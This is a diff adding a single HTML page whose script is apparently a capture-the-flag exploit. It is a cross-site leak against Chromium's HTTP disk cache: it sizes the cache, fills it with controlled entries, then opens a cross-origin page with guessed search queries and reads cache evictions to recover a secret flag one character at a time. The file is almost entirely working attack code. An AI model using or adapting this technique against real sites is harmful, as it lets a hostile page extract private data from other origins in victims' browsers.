@@ -1,0 +1,241 @@
+<html>
+
+<body>
+    <script>
+        MB = 1024 * 1024;
+        const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+        const log = msg => { console.log(`[${new Date().toISOString()}] ${msg}`) };
+
+        async function fetchFullChunk(size, marker, padding, opts = {}) {
+            const p = new URLSearchParams({ size });
+            if (marker) p.set("x", marker);
+            if (padding) p.set("pad", padding);
+            return fetch(`/chunk?${p.toString()}`, opts).then(r => r.arrayBuffer());
+        }
+
+        async function fetchChunkHead(size, marker, padding, opts = {}) {
+            const p = new URLSearchParams({ size });
+            if (marker) p.set("x", marker);
+            if (padding) p.set("pad", padding);
+            const response = await fetch(`/chunk?${p.toString()}`, opts);
+            if (response.body) {
+                try {
+                    await response.body.cancel();
+                } catch {
+                    // The cache hit already happened; this is only best-effort cleanup.
+                }
+            }
+            return response;
+        }
+
+        async function warmAndCleanBucketEntries(bucket) {
+            // warm up all entries in the bucket to reset their eviction score (age_seconds = 0)
+            // and filter out evicted entries at the same time
+            const s = Date.now();
+            const results = await Promise.allSettled(
+                bucket.map(async (p) => {
+                    await fetchChunkHead(p.size, p.cb, p.padding, {
+                        mode: "same-origin",
+                        cache: "only-if-cached",
+                    });
+                    //log(`probe ${p.i}-${p.cb}: cache hit: true`);
+                })
+            );
+            const survivors = bucket.filter((p, i) => {
+                if (results[i].status !== "fulfilled") {
+                    //log(`probe ${p.i}-${p.cb}: cache hit: false`);
+                    return false;
+                }
+                return true;
+            });
+            const elapsed = (Date.now() - s) / 1000;
+            if (elapsed > 1) log(`!!! bucket warm too slow`);
+            log(`warmed up ${survivors.length} bucket entries in ${elapsed} seconds`);
+            return survivors;
+        }
+
+        async function findDiskCacheSize(probe_size = 70 * MB) {
+            const marker_size = probe_size * 50; // shadow `age_seconds` multiplication in cache score because we keep hitting it in the loop
+            await fetch(`/chunk?size=${marker_size}&x=marker`);
+            var evicted = false;
+            var n_allocations = 0;
+            var total_allocated = 0;
+
+            while (!evicted) {
+                const cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+                const padding = "A".repeat(49); // adjust it to match 256 bytes cache slabs
+                await fetch(`/chunk?size=${probe_size}&x=${cb}&pad=${padding}`);
+                const cache_entry_size = 4098 * 256; // adjust it match actual size
+                total_allocated += cache_entry_size;
+                n_allocations++;
+
+                if (n_allocations % 20 == 0) {
+                    // after 20 * 1 MB allocations + sleep(50), 1s since the last access to the marker entry
+                    // age_seconds will be 1 instead of 0, so we can probe now.
+                    try {
+                        await fetch(`/chunk?size=${marker_size}&x=marker`, { mode: "same-origin", cache: "only-if-cached" });
+                    } catch (e) {
+                        evicted = true;
+                    }
+                }
+                //await sleep(50);
+            }
+            return total_allocated;
+        }
+
+        async function oracle1(chunk_size, marker, padding) {
+            var cacheHit = false;
+            try {
+                await fetchFullChunk(chunk_size, marker, padding);
+                await fetchChunkHead(chunk_size, marker, padding, { mode: "same-origin", cache: "only-if-cached" });
+                cacheHit = true;
+            } catch (e) {
+                console.error(e);
+            }
+            return cacheHit;
+        }
+
+        async function findDiskCacheSize2() {
+            /*
+            chromium/src/net/disk_cache/cache_util.cc:107 
+              - if available < 1.25 * 80 MiB: use 80% of available
+              - else if available < 10 * 80 MiB: use 80 MiB
+              - else if available < 25 * 80 MiB: use 10% of available
+              - else if available < 250 * 80 MiB: use 2.5 * 80 MiB = 200 MiB
+              - else: use 1% of available
+            */
+
+            // first find the upper bound by exponentially increasing probe size until we get a cache miss
+            var found = false;
+            var probe_size = 1 * MB;
+            while (!found) {
+                const cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+                const padding = "A".repeat(49);
+                const cacheHit = await oracle1(probe_size, cb, padding);
+                if (!cacheHit) found = true;
+                else probe_size *= 2;
+            }
+
+            // now binary search to find the exact size
+            var found = false;
+            var high = probe_size;
+            var low = probe_size / 2;
+            while (low <= high) {
+                const mid = Math.floor((low + high) / 2);
+                const cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+                const padding = "A".repeat(49);
+                const cacheHit = await oracle1(mid, cb, padding);
+                if (cacheHit) low = mid + 1;
+                else high = mid - 1;
+                log(`probe_size: ${mid}, cache hit: ${cacheHit}, low: ${low}, high: ${high}`);
+            }
+            probe_size = low - 1;
+            const max_disk_cache_global_size = probe_size * 8;
+            log(`max cache entry size is ${probe_size} bytes (${probe_size / MB} MiB), therefore max disk cache size is ${max_disk_cache_global_size} bytes (${max_disk_cache_global_size / MB} MiB)`);
+            return max_disk_cache_global_size;
+        }
+
+        async function oracle2(disk_cache_size) {
+            // 0) trigger one cleanup cycle (high_watermark -> low_watermark) to only have our entries in cache
+            // 1) fill up to high_watermark - 256
+            // 2) low_watermark start -> fill up to high_watermark - 256 -> re-warm cache for before-low_watermark fillers -> put cross-origin probe entry (N+256/N+512 bytes) -> check if first filler entry after low_watermark is evicted
+            // 3) repeat 2) for each probe
+
+            /* ######## step 0 ######## */
+            const max_entry_size = disk_cache_size / 8;
+            const padding = 64; // avoid 3x count because of cachekey len in _0, _1, _2 files
+            const probe_size = max_entry_size - (256 * 3) + padding;
+            // cache_entry_index_size = round_256(body_size + stream0_size + 3*key_length + 3 * (24 header + 24 eof))
+            // logical_overhead = 2 * key_length + 2 * (24+24)
+            var probes_bucket = [];
+            const s = Date.now();
+            for (let i = 0; i < 8; i++) {
+                const cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+                // warm up cache entries before each probe to avoid them being evicted
+                // since they'll have eviction score 0 (age_seconds = 0)
+                probes_bucket = await warmAndCleanBucketEntries(probes_bucket);
+                await fetchFullChunk(probe_size, cb);
+                probes_bucket.push({ i, size: probe_size, cb });
+                //await sleep(1000);
+            }
+            const elapsed = (Date.now() - s) / 1000;
+            log(`filled up bucket with 8 probes in ${elapsed} seconds`);
+
+            // lets remove the evicted entry now
+            probes_bucket = await warmAndCleanBucketEntries(probes_bucket);
+
+            // at this point disk cache will be filled with 7 entries (87.5%) that we control
+            // lets fill that 7.5% - 256bytes remaining
+            // probe_size is exactly 12.5%, therefore to calculate filler_size, we do probe_size * (7.5/12.5) - 256, which is the same as disk_cache_size * (7.5/100) - 256
+            const space_to_leave = 26 * 256; //
+            const padding2 = 71;
+            const filler_size = (max_entry_size / 12.5 * 7.5) - (256 * 3) + padding2 - space_to_leave;
+            const filler_cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+            await fetchFullChunk(filler_size, filler_cb);
+            probes_bucket.push({ i: /*n*/ probes_bucket.length, size: filler_size, cb: filler_cb });
+            await sleep(1000);
+
+            //probes_bucket.forEach(p => console.log(`probe ${p.i}: size: ${p.size}, cb: ${p.cb}`));
+
+            /* ######## step 1 ######## */
+            const padding3 = "A".repeat(59);
+            var flag_probe = "flag";
+            const w = window.open(`http://web:8000/?q=${flag_probe}&pad=${padding3}`);
+            await sleep(1000);
+            // if all probes are still in the bucket, then flag probe was successfull, otherwise not
+            const prev_bucket = probes_bucket;
+            probes_bucket = await warmAndCleanBucketEntries(probes_bucket);
+            var probe_success = probes_bucket.length === prev_bucket.length;
+            log(`probe success: ${probe_success}, remaining probes in bucket: ${probes_bucket.length}`);
+
+            /* ######## step 2 ######## */
+            // repeat 
+            const alphabet = "fabcdefghijklmnopqrstuvwxyz0123456789";
+            const base_padding = "A".repeat(62);
+            var flag = "";
+            for (let i = 0; i < alphabet.length; i++) {
+                // warm up all bucket entries to avoid them being evicted, since they'll have eviction score 0 (age_seconds = 0)
+                var start = Date.now();
+                probes_bucket = await warmAndCleanBucketEntries(probes_bucket);
+                log(`warming up probes bucket entries, time since start: ${(Date.now() - start) / 1000} seconds`);
+                // for each, reclaim cache control with 1 max size filler entry
+                const filler_cb = (Math.random() * 0xFFFFFFFFFFFFF).toString(16).slice(0, 10);
+                await fetchFullChunk(probe_size, filler_cb);
+                probes_bucket.push({ i: /*n*/ probes_bucket.length, size: probe_size, cb: filler_cb });
+
+                // probe, NOTE: beaware of eviction scores atp
+                const c = alphabet[i];
+                const probe = flag + c;
+                const padding4 = base_padding + Math.floor(probe.length / 3);
+                w.location = `http://web:8000/?q=${probe}&pad=${padding4}`;
+
+                // if all probes are still in the bucket, then flag probe was successfull, otherwise not
+                const prev_bucket = probes_bucket;
+                probes_bucket = await warmAndCleanBucketEntries(probes_bucket);
+                var probe_success = (probes_bucket.length === prev_bucket.length);
+                log(`probe success: ${probe_success}, remaining probes in bucket: ${probes_bucket.length}`);
+
+                if (probe_success) {
+                    flag = probe;
+                    log(`current flag: ${flag}`)
+                }
+                break;
+
+            }
+        }
+
+        async function main() {
+            await sleep(1000);
+            //const cache_size = await findDiskCacheSize2();
+            //console.log(`Estimated disk cache size: ${cache_size} bytes`);
+            //await fetch("/submit?size=" + cache_size);
+            const disk_cache_size = 800 * MB;
+            await oracle2(disk_cache_size);
+        }
+
+        main();
+    </script>
+</body>
+
+</html>
+
